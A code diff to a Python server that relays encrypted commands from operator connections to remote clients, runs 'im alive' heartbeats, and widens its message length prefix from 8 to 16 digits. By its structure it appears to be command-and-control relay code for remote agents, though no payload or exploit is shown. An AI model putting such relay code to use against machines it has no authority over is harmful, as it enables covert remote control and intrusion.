@@ -67,22 +67,26 @@ class MyServer():
         self.cmd_connections.append(connection)
         aes_key = self.negotiate_secret(connection[0])
         while True:
-            data_len = connection[0].recv(8).decode()
-            data = connection[0].recv(int(data_len))
+            data_len = connection[0].recv(16).decode()
+            print(data_len)
+            data = connection[0].recv(200000)
+            while len(data) != int(data_len):
+                data += connection[0].recv(200000)
+            
             data = self.decrypt_msg(data, aes_key)
             data = json.loads(data.decode())
             if "command" in data:
                 if data['command'] == "get_clients":
                     msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
-                    connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                    connection[0].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
 
                 elif data['command'] == "heartbeat":
                     temp_clients = self.client_sockets
                     for client in self.client_sockets:
                         try:
                             msg = self.encrypt_msg(json.dumps(data), client[1])
-                            client[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
-                            response_len = client[0].recv(8)
+                            client[0].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                            response_len = client[0].recv(16)
                             response = client[0].recv(int(response_len.decode()))
                             response = self.decrypt_msg(response, client[1])
                             if response.decode() != "im alive":
@@ -96,15 +100,15 @@ class MyServer():
                             print("removing client")
                     self.client_sockets = temp_clients
                     msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
-                    connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                    connection[0].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
                 else:
                     msg = self.encrypt_msg(json.dumps(data) ,self.find_client(data["client_id"])[1])
-                    self.find_client(data["client_id"])[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
-                    response_len = self.find_client(data["client_id"])[0].recv(8)
+                    self.find_client(data["client_id"])[0].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                    response_len = self.find_client(data["client_id"])[0].recv(16)
                     response = self.find_client(data["client_id"])[0].recv(int(response_len.decode()))
                     response = self.decrypt_msg(response, self.find_client(data["client_id"])[1])
                     msg = self.encrypt_msg(response.decode(), aes_key)
-                    connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                    connection[0].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
     #function to bind socket to port
     def bind(self, sock, host, port):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
